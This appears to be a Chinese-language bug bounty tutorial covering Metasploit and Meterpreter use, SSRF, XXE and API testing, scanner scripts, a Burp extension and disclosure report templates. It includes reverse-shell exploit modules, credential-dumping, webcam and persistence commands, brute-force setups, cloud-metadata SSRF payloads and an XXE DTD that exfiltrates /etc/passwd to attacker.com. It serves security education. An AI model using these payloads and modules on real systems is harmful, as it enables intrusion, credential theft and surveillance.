**7.1.1 Kali Linux安裝**（預裝）：

```bash
# 檢查版本
msfconsole --version

# 更新Metasploit
sudo apt update
sudo apt install metasploit-framework

# 初始化資料庫
sudo msfdb init

# 啟動Metasploit
msfconsole
```

**7.1.2 基本命令介紹**：

```bash
# 啟動MSF Console
msfconsole

# 顯示幫助
help

# 搜索模組
search apache
search type:exploit platform:linux
search cve:2021-44228

# 查看模組資訊
info exploit/multi/http/apache_struts_code_exec

# 使用模組
use exploit/multi/http/apache_struts_code_exec

# 查看模組選項
show options
show advanced

# 設定選項
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444

# 查看可用payload
show payloads

# 設定payload
set payload windows/meterpreter/reverse_tcp

# 執行exploit
exploit
# 或
run
```

**7.1.3 工作區管理**：

```bash
# 查看工作區
workspace

# 創建新工作區
workspace -a target_company

# 切換工作區
workspace target_company

# 刪除工作區
workspace -d old_workspace
```


### 7.2 常用輔助模組

**7.2.1 掃描模組**：

```bash
# 端口掃描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,8080
run

# HTTP標題掃描
use auxiliary/scanner/http/http_header
set RHOSTS 192.168.1.100
run

# SSH版本掃描
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# SMB掃描
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run
```

**7.2.2 暴力破解模組**：

```bash
# SSH暴力破解
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# HTTP表單暴力破解
use auxiliary/scanner/http/http_login
set RHOSTS 192.168.1.100
set TARGETURI /admin/login.php
set USERNAME admin
set PASS_FILE /usr/share/wordlists/common_passwords.txt
run

# MySQL暴力破解
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.100
set USERNAME root
set BLANK_PASSWORDS true
set USER_AS_PASS true
run
```


### 7.3 基本Exploit使用

**7.3.1 Web應用程式Exploits**：

```bash
# Apache Struts漏洞
use exploit/multi/http/struts_code_exec_parameters
set RHOSTS target.com
set TARGETURI /struts2-showcase/
set payload java/jsp_shell_reverse_tcp
set LHOST your_ip
exploit

# Drupal漏洞
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS target.com
set TARGETURI /
exploit
```

**注意事項**：

```
❌ 在Bug Bounty中，通常不建議使用實際的exploit模組
✅ 建議只用於概念驗證（PoC）
✅ 優先使用scanner和auxiliary模組
✅ 總是獲得明確授權後才使用
```


### 7.4 Meterpreter基礎

**7.4.1 Meterpreter基本命令**：

```bash
# 系統資訊
sysinfo
getuid
getpid

# 檔案系統操作
pwd
ls
cd /tmp
cat /etc/passwd
download /etc/passwd
upload /root/tool.sh /tmp/

# 網路資訊
ifconfig
netstat
route

# 程序管理
ps
kill 1234
migrate 5678

# 螢幕截圖
screenshot

# 網絡攝像頭
webcam_list
webcam_snap

# 持久化
run persistence -U -i 60 -p 4444 -r 192.168.1.50
```

**7.4.2 後滲透模組**：

```bash
# 權限提升
use post/windows/escalate/getsystem
use post/linux/escalate/cve2021_4034_pwnkit

# 資訊收集
use post/windows/gather/enum_system
use post/linux/gather/enum_configs

# 憑證轉儲
use post/windows/gather/credentials/credential_collector
use post/linux/gather/pam

# 網路探索
use post/multi/gather/ping_sweep
use post/windows/gather/arp_scanner
```


## 第八部分：進階Bug Bounty技術

### 8.1 API安全測試

**8.1.1 API偵察技術**：

```bash
# API端點發現
# 從JavaScript檔案中提取API端點
curl -s https://target.com | grep -oE 'src="[^"]*\.js"' | cut -d'"' -f2 | while read js; do
    curl -s "https://target.com$js" | grep -oE '/api/[a-zA-Z0-9/_-]*'
done | sort -u

# 從robots.txt尋找API路徑
curl -s https://target.com/robots.txt | grep -i api

# 常見API端點字典
/api/v1/
/api/v2/
/rest/
/graphql
/swagger
/api-docs
```

**8.1.2 API測試方法**：

```bash
# REST API測試
# GET請求
curl -X GET "https://api.target.com/users/123" -H "Authorization: Bearer TOKEN"

# POST請求
curl -X POST "https://api.target.com/users" \
     -H "Content-Type: application/json" \
     -d '{"name":"test","email":"test@test.com"}'

# PUT請求（測試IDOR）
curl -X PUT "https://api.target.com/users/124" \
     -H "Authorization: Bearer TOKEN" \
     -d '{"admin":true}'

# DELETE請求
curl -X DELETE "https://api.target.com/users/123" \
     -H "Authorization: Bearer TOKEN"
```

**8.1.3 GraphQL測試**：

```bash
# 內省查詢（Introspection）
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
       "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } } }"
     }'

# 查詢所有類型
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
       "query": "{ __schema { types { name } } }"
     }'

# 深度查詢攻擊
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{
       "query": "{ users { posts { comments { replies { author { posts { comments } } } } } } }"
     }'
```


### 8.2 Server-Side Request Forgery (SSRF)

**8.2.1 SSRF基本概念**：

SSRF是一種漏洞，攻擊者可以濫用伺服器功能來存取或操作伺服器無法直接存取的資源。

**8.2.2 SSRF檢測方法**：

```bash
# 基本SSRF測試
http://target.com/proxy?url=http://169.254.169.254/
http://target.com/fetch?url=http://localhost:22
http://target.com/api/fetch?url=file:///etc/passwd

# AWS元數據
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud元數據
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# 內部網路掃描
http://192.168.1.1/
http://10.0.0.1/
http://172.16.0.1/
```

**8.2.3 SSRF繞過技術**：

```bash
# URL編碼
http://target.com/proxy?url=http%3A//169.254.169.254/

# 雙重URL編碼
http://target.com/proxy?url=http%253A//169.254.169.254/

# IP地址變化
http://2130706433/  # localhost的十進制表示
http://0x7f000001/  # localhost的十六進制表示
http://0177.0.0.1/  # localhost的八進制表示

# 域名繞過
http://localtest.me/  # 解析到127.0.0.1
http://lvh.me/        # 解析到127.0.0.1
http://vcap.me/       # 解析到127.0.0.1

# 重定向繞過
# 創建重定向到內部IP的URL
http://attacker.com/redirect?to=http://169.254.169.254/
```

**8.2.4 SSRF漏洞利用**：

```python
#!/usr/bin/env python3
"""
SSRF自動化測試腳本
"""
import requests
import sys

def test_ssrf(target_url, param_name):
    """
    測試SSRF漏洞
    """
    # 測試目標清單
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:22",
        "http://127.0.0.1:80",
        "file:///etc/passwd",
        "file:///proc/version",
        "http://metadata.google.internal/",
        "http://169.254.169.254/computeMetadata/v1/"
    ]
    
    vulnerable = []
    
    for payload in payloads:
        try:
            params = {param_name: payload}
            response = requests.get(target_url, params=params, timeout=10)
            
            # 檢查回應內容
            if any(indicator in response.text.lower() for indicator in 
                   ['meta-data', 'ssh-2.0', 'root:', 'linux version', 'metadata']):
                vulnerable.append(payload)
                print(f"[+] 可能的SSRF: {payload}")
                print(f"    回應長度: {len(response.text)}")
                print(f"    狀態碼: {response.status_code}")
                
        except requests.RequestException as e:
            print(f"[-] 請求失敗 {payload}: {e}")
    
    return vulnerable

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("用法: python3 ssrf_test.py <target_url> <param_name>")
        print("範例: python3 ssrf_test.py http://target.com/proxy url")
        sys.exit(1)
    
    target = sys.argv[^1]
    param = sys.argv[^2]
    
    print(f"[*] 測試SSRF漏洞: {target}")
    vulnerabilities = test_ssrf(target, param)
    print(f"\n[*] 發現 {len(vulnerabilities)} 個潛在SSRF漏洞")
```


### 8.3 XML External Entity (XXE)

**8.3.1 XXE基本概念**：

XXE是一種攻擊，利用XML處理器中的漏洞來存取本地或遠程內容。

**8.3.2 XXE檢測技術**：

```xml
<!-- 基本XXE測試 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Windows系統檔案 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>

<!-- 外部DTD -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- 參數實體 -->
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
```

**外部DTD檔案（evil.dtd）**：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

**8.3.3 XXE自動化測試**：

```python
#!/usr/bin/env python3
"""
XXE自動化測試腳本
"""
import requests
import xml.etree.ElementTree as ET

def test_xxe(target_url, headers=None):
    """
    測試XXE漏洞
    """
    if headers is None:
        headers = {'Content-Type': 'application/xml'}
    
    # XXE測試負載
    payloads = [
        # 基本檔案讀取
        '''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <root>&xxe;</root>''',
        
        # Windows檔案
        '''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
        <root>&xxe;</root>''',
        
        # 內部網路掃描
        '''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
        <root>&xxe;</root>''',
        
        # 外部DTD
        '''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
        <root>test</root>'''
    ]
    
    vulnerable = []
    
    for i, payload in enumerate(payloads):
        try:
            response = requests.post(target_url, data=payload, headers=headers, timeout=10)
            
            # 檢查是否成功讀取檔案
            if any(indicator in response.text for indicator in 
                   ['root:', 'localhost', 'meta-data', '<!DOCTYPE']):
                vulnerable.append(f"Payload {i+1}")
                print(f"[+] 可能的XXE漏洞 - Payload {i+1}")
                print(f"    回應長度: {len(response.text)}")
                print(f"    部分回應: {response.text[:200]}...")
                
        except requests.RequestException as e:
            print(f"[-] 請求失敗 Payload {i+1}: {e}")
    
    return vulnerable

if __name__ == "__main__":
    target = "http://target.com/xml_endpoint"
    vulnerabilities = test_xxe(target)
    print(f"\n[*] 發現 {len(vulnerabilities)} 個潜在XXE漏洞")
```


## 第九部分：自動化工具開發

### 9.1 Python自動化腳本開發

**9.1.1 子域名枚舉自動化**：

```python
#!/usr/bin/env python3
"""
完整的子域名枚舉自動化腳本
"""
import requests
import dns.resolver
import threading
import queue
import time
from concurrent.futures import ThreadPoolExecutor
import argparse

class SubdomainEnumerator:
    def __init__(self, domain, threads=50, timeout=5):
        self.domain = domain
        self.threads = threads
        self.timeout = timeout
        self.found_subdomains = set()
        self.wordlist_queue = queue.Queue()
        
    def load_wordlist(self, wordlist_file):
        """載入字典檔案"""
        try:
            with open(wordlist_file, 'r') as f:
                for line in f:
                    subdomain = line.strip()
                    if subdomain:
                        self.wordlist_queue.put(subdomain)
            print(f"[+] 載入了 {self.wordlist_queue.qsize()} 個子域名")
        except FileNotFoundError:
            print(f"[-] 字典檔案 {wordlist_file} 未找到")
            return False
        return True
    
    def check_subdomain(self, subdomain):
        """檢查子域名是否存在"""
        full_domain = f"{subdomain}.{self.domain}"
        
        try:
            # DNS查詢
            answers = dns.resolver.resolve(full_domain, 'A')
            ip_addresses = [str(answer) for answer in answers]
            
            # HTTP檢查
            try:
                response = requests.get(f"http://{full_domain}", 
                                      timeout=self.timeout, 
                                      allow_redirects=True)
                status_code = response.status_code
                title = self.extract_title(response.text)
            except:
                status_code = "N/A"
                title = "N/A"
                
            result = {
                'subdomain': full_domain,
                'ip': ip_addresses,
                'status_code': status_code,
                'title': title
            }
            
            self.found_subdomains.add(full_domain)
            print(f"[+] 發現: {full_domain} -> {ip_addresses[^0]} [{status_code}] {title}")
            return result
            
        except dns.resolver.NXDOMAIN:
            pass
        except dns.resolver.Timeout:
            pass
        except Exception as e:
            pass
            
        return None
    
    def extract_title(self, html_content):
        """從HTML中提取title"""
        try:
            start = html_content.lower().find('<title>') + 7
            end = html_content.lower().find('</title>')
            if start > 6 and end > start:
                return html_content[start:end].strip()[:50]
        except:
            pass
        return "N/A"
    
    def worker(self):
        """工作執行緒"""
        while True:
            try:
                subdomain = self.wordlist_queue.get(timeout=1)
                self.check_subdomain(subdomain)
                self.wordlist_queue.task_done()
            except queue.Empty:
                break
    
    def enumerate(self, wordlist_file, output_file=None):
        """執行枚舉"""
        print(f"[*] 開始枚舉子域名：{self.domain}")
        
        if not self.load_wordlist(wordlist_file):
            return
        
        # 啟動執行緒
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 等待完成
        self.wordlist_queue.join()
        
        # 輸出結果
        print(f"\n[+] 完成！發現 {len(self.found_subdomains)} 個子域名")
        
        if output_file:
            with open(output_file, 'w') as f:
                for subdomain in sorted(self.found_subdomains):
                    f.write(f"{subdomain}\n")
            print(f"[+] 結果已儲存至 {output_file}")
        
        return list(self.found_subdomains)

def main():
    parser = argparse.ArgumentParser(description="子域名枚舉工具")
    parser.add_argument("-d", "--domain", required=True, help="目標域名")
    parser.add_argument("-w", "--wordlist", required=True, help="字典檔案路徑")
    parser.add_argument("-t", "--threads", type=int, default=50, help="執行緒數")
    parser.add_argument("-o", "--output", help="輸出檔案")
    parser.add_argument("--timeout", type=int, default=5, help="超時時間")
    
    args = parser.parse_args()
    
    enumerator = SubdomainEnumerator(
        domain=args.domain,
        threads=args.threads,
        timeout=args.timeout
    )
    
    enumerator.enumerate(args.wordlist, args.output)

if __name__ == "__main__":
    main()
```

**9.1.2 漏洞掃描器開發**：

```python
#!/usr/bin/env python3
"""
多功能Web漏洞掃描器
"""
import requests
import urllib.parse
import re
from bs4 import BeautifulSoup
import concurrent.futures
from dataclasses import dataclass
from typing import List, Dict, Optional

@dataclass
class Vulnerability:
    type: str
    url: str
    parameter: str
    payload: str
    evidence: str
    severity: str

class WebVulnScanner:
    def __init__(self, timeout=10, max_workers=20):
        self.timeout = timeout
        self.max_workers = max_workers
        self.vulnerabilities = []
        
        # SQL注入測试負載
        self.sqli_payloads = [
            "'", "\"", "' OR '1'='1", "' OR '1'='1'--", 
            "' OR '1'='1'/*", "\" OR \"1\"=\"1", 
            "' UNION SELECT 1--", "'; WAITFOR DELAY '00:00:05'--"
        ]
        
        # XSS測試負載
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<svg onload=\"alert('XSS')\">",
            "javascript:alert('XSS')",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>"
        ]
        
        # IDOR測試範圍
        self.idor_params = ['id', 'user', 'userid', 'account', 'doc', 'file']
    
    def scan_sql_injection(self, url, params):
        """SQL注入掃描"""
        for param_name, param_value in params.items():
            for payload in self.sqli_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = requests.get(url, params=test_params, timeout=self.timeout)
                    
                    # 檢查SQL錯誤訊息
                    sql_errors = [
                        'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB Provider',
                        'PostgreSQL query failed', 'SQLServer JDBC Driver',
                        'sqlite3_prepare_v2', 'mysql_num_rows',
                        'You have an error in your SQL syntax'
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            vuln = Vulnerability(
                                type="SQL Injection",
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                evidence=error,
                                severity="High"
                            )
                            self.vulnerabilities.append(vuln)
                            print(f"[!] SQL注入漏洞發現: {url}?{param_name}={payload}")
                            break
                            
                except requests.RequestException:
                    pass
    
    def scan_xss(self, url, params):
        """XSS掃描"""
        for param_name, param_value in params.items():
            for payload in self.xss_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = requests.get(url, params=test_params, timeout=self.timeout)
                    
                    # 檢查payload是否被反映在回應中
                    if payload in response.text:
                        vuln = Vulnerability(
                            type="Cross-Site Scripting",
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            evidence="Payload reflected in response",
                            severity="Medium"
                        )
                        self.vulnerabilities.append(vuln)
                        print(f"[!] XSS漏洞發現: {url}?{param_name}={payload}")
                        
                except requests.RequestException:
                    pass
    
    def scan_idor(self, url, params):
        """IDOR掃描"""
        for param_name, param_value in params.items():
            if param_name.lower() in self.idor_params:
                # 嘗試不同的ID值
                test_ids = ['1', '2', '3', '100', '999', '0', '-1']
                
                original_response = None
                try:
                    original_response = requests.get(url, params=params, timeout=self.timeout)
                except requests.RequestException:
                    continue
                
                for test_id in test_ids:
                    if test_id != param_value:
                        test_params = params.copy()
                        test_params[param_name] = test_id
                        
                        try:
                            response = requests.get(url, params=test_params, timeout=self.timeout)
                            
                            # 檢查是否能存取其他資源
                            if (response.status_code == 200 and 
                                response.text != original_response.text and
                                len(response.text) > 100):
                                
                                vuln = Vulnerability(
                                    type="Insecure Direct Object Reference",
                                    url=url,
                                    parameter=param_name,
                                    payload=test_id,
                                    evidence=f"Different response for ID {test_id}",
                                    severity="Medium"
                                )
                                self.vulnerabilities.append(vuln)
                                print(f"[!] IDOR漏洞發現: {url}?{param_name}={test_id}")
                                break
                                
                        except requests.RequestException:
                            pass
    
    def extract_forms(self, url):
        """提取網頁中的表單"""
        try:
            response = requests.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', url),
                    'method': form.get('method', 'get').lower(),
                    'inputs': {}
                }
                
                for input_tag in form.find_all('input'):
                    name = input_tag.get('name')
                    if name:
                        form_data['inputs'][name] = input_tag.get('value', 'test')
                
                forms.append(form_data)
            
            return forms
        except:
            return []
    
    def scan_url(self, url):
        """掃描單個URL"""
        print(f"[*] 掃描URL: {url}")
        
        # 解析URL參數
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        # 只取每個參數的第一個值
        params = {k: v[^0] if v else '' for k, v in params.items()}
        
        if params:
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            
            # 執行各種漏洞掃描
            self.scan_sql_injection(base_url, params)
            self.scan_xss(base_url, params)
            self.scan_idor(base_url, params)
        
        # 掃描表單
        forms = self.extract_forms(url)
        for form in forms:
            if form['inputs']:
                action_url = urllib.parse.urljoin(url, form['action'])
                if form['method'] == 'get':
                    self.scan_sql_injection(action_url, form['inputs'])
                    self.scan_xss(action_url, form['inputs'])
    
    def scan_urls(self, urls):
        """掃描多個URL"""
        print(f"[*] 開始掃描 {len(urls)} 個URL")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.scan_url, url) for url in urls]
            concurrent.futures.wait(futures)
        
        print(f"\n[+] 掃描完成！發現 {len(self.vulnerabilities)} 個漏洞")
        
        # 輸出結果
        for vuln in self.vulnerabilities:
            print(f"\n漏洞類型: {vuln.type}")
            print(f"URL: {vuln.url}")
            print(f"參數: {vuln.parameter}")
            print(f"負載: {vuln.payload}")
            print(f"證據: {vuln.evidence}")
            print(f"嚴重性: {vuln.severity}")
            print("-" * 50)
    
    def generate_report(self, output_file):
        """生成報告"""
        with open(output_file, 'w') as f:
            f.write("Web漏洞掃描報告\n")
            f.write("=" * 50 + "\n\n")
            f.write(f"總共發現 {len(self.vulnerabilities)} 個漏洞\n\n")
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                f.write(f"漏洞 #{i}\n")
                f.write(f"類型: {vuln.type}\n")
                f.write(f"URL: {vuln.url}\n")
                f.write(f"參數: {vuln.parameter}\n")
                f.write(f"負載: {vuln.payload}\n")
                f.write(f"證據: {vuln.evidence}\n")
                f.write(f"嚴重性: {vuln.severity}\n")
                f.write("-" * 30 + "\n\n")
        
        print(f"[+] 報告已儲存至: {output_file}")

def main():
    # 示例使用
    scanner = WebVulnScanner()
    
    # 要掃描的URL列表
    urls = [
        "http://testphp.vulnweb.com/artists.php?artist=1",
        "http://testphp.vulnweb.com/listproducts.php?cat=1",
        "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg"
    ]
    
    scanner.scan_urls(urls)
    scanner.generate_report("vulnerability_report.txt")

if __name__ == "__main__":
    main()
```


### 9.2 Burp Suite擴展開發

**9.2.1 基本擴展結構**：

```java
// BurpExtender.java
package burp;

import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

public class BurpExtender implements IBurpExtender, IHttpListener, ITab {
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private PrintWriter stdout;
    private PrintWriter stderr;
    
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        // 保存callbacks參考
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        
        // 設定輸出流
        stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);
        
        // 設定擴展名稱
        callbacks.setExtensionName("Bug Bounty Helper");
        
        // 註冊HTTP監聽器
        callbacks.registerHttpListener(this);
        
        // 新增自定義頁籤
        callbacks.addSuiteTab(this);
        
        stdout.println("Bug Bounty Helper 擴展載入成功！");
    }
    
    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, 
                                 IHttpRequestResponse messageInfo) {
        // 只處理Proxy工具的HTTP訊息
        if (toolFlag == IBurpExtenderCallbacks.TOOL_PROXY) {
            if (messageIsRequest) {
                processRequest(messageInfo);
            } else {
                processResponse(messageInfo);
            }
        }
    }
    
    private void processRequest(IHttpRequestResponse messageInfo) {
        // 分析HTTP請求
        IRequestInfo request = helpers.analyzeRequest(messageInfo);
        
        // 檢查是否包含敏感參數
        List<IParameter> parameters = request.getParameters();
        for (IParameter param : parameters) {
            String paramName = param.getName().toLowerCase();
            String paramValue = param.getValue();
            
            // 檢查可能的IDOR參數
            if (paramName.contains("id") || paramName.contains("user")) {
                stdout.println("[IDOR檢查] 發現潛在IDOR參數: " + 
                              param.getName() + " = " + paramValue);
            }
            
            // 檢查可能的路徑遍歷
            if (paramValue.contains("../") || paramValue.contains("..\\")) {
                stdout.println("[路徑遍歷] 檢測到路徑遍歷嘗試: " + 
                              param.getName() + " = " + paramValue);
            }
        }
    }
    
    private void processResponse(IHttpRequestResponse messageInfo) {
        // 分析HTTP回應
        IResponseInfo response = helpers.analyzeResponse(messageInfo.getResponse());
        
        // 檢查回應標頭
        List<String> headers = response.getHeaders();
        boolean hasSecurityHeaders = false;
        
        for (String header : headers) {
            String headerLower = header.toLowerCase();
            if (headerLower.startsWith("x-frame-options") ||
                headerLower.startsWith("x-content-type-options") ||
                headerLower.startsWith("x-xss-protection") ||
                headerLower.startsWith("content-security-policy")) {
                hasSecurityHeaders = true;
                break;
            }
        }
        
        if (!hasSecurityHeaders) {
            IRequestInfo request = helpers.analyzeRequest(messageInfo);
            stdout.println("[安全標頭] 缺少安全標頭的URL: " + 
                          request.getUrl().toString());
        }
    }
    
    // ITab介面實作
    @Override
    public String getTabCaption() {
        return "Bug Bounty";
    }
    
    @Override
    public java.awt.Component getUiComponent() {
        // 創建簡單的UI
        javax.swing.JPanel panel = new javax.swing.JPanel();
        javax.swing.JLabel label = new javax.swing.JLabel(
            "<html><h2>Bug Bounty Helper</h2>" +
            "<p>此擴展會自動檢查以下問題：</p>" +
            "<ul>" +
            "<li>潛在的IDOR參數</li>" +
            "<li>路徑遍歷攻擊</li>" +
            "<li>缺少的安全標頭</li>" +
            "</ul></html>"
        );
        panel.add(label);
        return panel;
    }
}
```

**9.2.2 編譯和安裝擴展**：

```bash
# 創建專案目錄
mkdir burp-extension
cd burp-extension

# 下載Burp Extender API
wget https://portswigger.net/burp/extender/burp-extender-api-2.3.jar

# 編譯擴展
javac -cp "burp-extender-api-2.3.jar" BurpExtender.java

# 創建JAR檔案
jar cf BugBountyHelper.jar BurpExtender.class

# 在Burp Suite中載入
# Extender > Extensions > Add > Extension type: Java > Extension file: BugBountyHelper.jar
```


## 第十部分：報告撰寫與溝通技巧

### 10.1 專業報告撰寫模板

**10.1.1 完整報告結構**：


# 漏洞報告 - [漏洞名稱]

## 執行摘要
- **漏洞類型**: Cross-Site Scripting (XSS)
- **嚴重程度**: 中等
- **CVSS評分**: 6.1
- **影響範圍**: 所有註冊用戶
- **修復時間**: 建議24小時內修復

## 漏洞詳情

### 描述
在用戶檔案上傳功能中發現儲存型跨站腳本漏洞。攻擊者可以上傳包含惡意JavaScript的檔案名稱，當其他用戶查看該檔案時，惡意腳本會在其瀏覽器中執行。

### 受影響的組件
- **URL**: https://target.com/upload
- **參數**: filename
- **HTTP方法**: POST
- **認證要求**: 需要註冊用戶帳戶

### 技術詳情
應用程式在顯示檔案清單時，直接將檔案名稱插入HTML中，而沒有進行適當的編碼或過濾。攻擊者可以利用這個漏洞執行任意JavaScript代碼。

## 概念驗證 (PoC)

### 重現步驟
1. 登入到應用程式 (https://target.com/login)
2. 導航到檔案上傳頁面 (https://target.com/upload)
3. 創建一個測試檔案，檔案名稱為: `<script>alert('XSS')</script>.txt`
4. 上傳檔案
5. 導航到檔案列表頁面 (https://target.com/files)
6. 觀察彈出警告框

### HTTP請求範例


POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="<script>alert('XSS')</script>.txt"
Content-Type: text/plain

Test file content
------WebKitFormBoundary7MA4YWxkTrZu0gW--



### 螢幕截圖
[包含顯示XSS執行的螢幕截圖]

## 影響評估

### 技術影響
- **機密性**: 中等 - 可以竊取用戶會話令牌
- **完整性**: 中等 - 可以修改頁面內容
- **可用性**: 低 - 不影響系統可用性

### 業務影響
- 用戶資料可能被竊取
- 品牌聲譽受損
- 可能違反資料保護法規
- 用戶信任度下降

### 攻擊場景
1. **會話劫持**: 攻擊者竊取其他用戶的會話Cookie
2. **釣魚攻擊**: 創建虛假登入表單竊取憑證
3. **惡意重定向**: 將用戶重定向到惡意網站
4. **內容篡改**: 修改頁面內容散布虛假資訊

## 修復建議

### 立即修復措施
1. **輸出編碼**: 對所有用戶輸入進行HTML實體編碼
```

function htmlEscape(str) {
return str.replace(/\&/g, '\&')
.replace(/</g, '<')
.replace(/>/g, '>')
.replace(/"/g, '"')
.replace(/'/g, '&#x27;');
}

```

2. **輸入驗證**: 限制檔案名稱字符集
```

// 只允許字母、數字、點和連字符
if (!preg_match('/^[a-zA-Z0-9.\-_]+\$/', \$filename)) {
throw new InvalidArgumentException('Invalid filename');
}

```

### 長期解決方案
1. 實施內容安全政策(CSP)
2. 使用安全的模板引擎
3. 定期進行安全代碼審查
4. 建立安全開發生命週期(SDLC)

### 驗證修復
1. 重新測試上傳功能
2. 確認HTML實體編碼正確實施
3. 測試各種XSS負載
4. 驗證CSP標頭正確設定

## 參考資源
- [OWASP XSS Prevention Cheat Sheet](https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP Testing Guide - XSS](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)

## 時間軸
- **2024-01-15 09:00**: 發現漏洞
- **2024-01-15 10:30**: 完成初步驗證
- **2024-01-15 14:00**: 提交報告
- **預計修復時間**: 2024-01-16 14:00

## 聯繫資訊
**研究人員**: [您的姓名]
**電子郵件**: [您的郵箱]
**PGP指紋**: [如果有的話]



### 10.2 溝通技巧與最佳實踐

**10.2.1 初始報告溝通模板**：

```
主旨: [嚴重程度] 安全漏洞報告 - [公司名稱] - [漏洞類型]

親愛的 [公司名稱] 安全團隊，

我是一名安全研究人員，在貴公司的 [應用程式/網站] 中發現了一個安全漏洞。

漏洞摘要：
- 類型：[漏洞類型]
- 嚴重程度：[低/中/高/嚴重]
- 影響：[簡要影響描述]

我已準備詳細的技術報告和概念驗證，以協助您驗證和修復此問題。為保護貴公司和用戶的安全，我承諾在漏洞修復前不會公開相關資訊。

請確認您收到此報告，我將在收到回覆後提供完整的技術細節。

期待您的回覆。

最佳問候，
[您的姓名]
[聯繫資訊]
[專業背景簡介]
```

**10.2.2 後續溝通範例**：

```
感謝您的快速回覆。

根據您的要求，我提供以下補充資訊：

1. 額外測試結果
2. 更詳細的修復建議
3. 相關的程式碼範例

我理解修復需要時間進行適當的測試和部署。請告知預計的修復時程，以便我們協調責任揭露的時間表。

如果需要任何澄清或額外資訊，請隨時聯繫我。

謝謝您對安全問題的重視。
```

**10.2.3 溝通最佳實踐**：

```
✅ 應該做的：
- 保持專業和建設性的語調
- 提供清晰、可重現的步驟
- 尊重公司的修復時程
- 保持耐心和理解
- 提供有用的修復建議

❌ 避免做的：
- 威脅或施壓
- 要求不合理的獎勵
- 公開未修復的漏洞
- 使用技術術語嚇唬非技術人員
- 對慢回應表現不耐煩
```


## 總結


**學習建議**：

1. **按順序學習**：從基礎開始，逐步深入
2. **實際操作**：理論結合實踐，多做實驗
3. **持續更新**：關注最新的漏洞類型和技術
4. **加入社群**：參與Bug Bounty社群交流經驗
5. **保持合法**：始終在授權範圍內進行測試


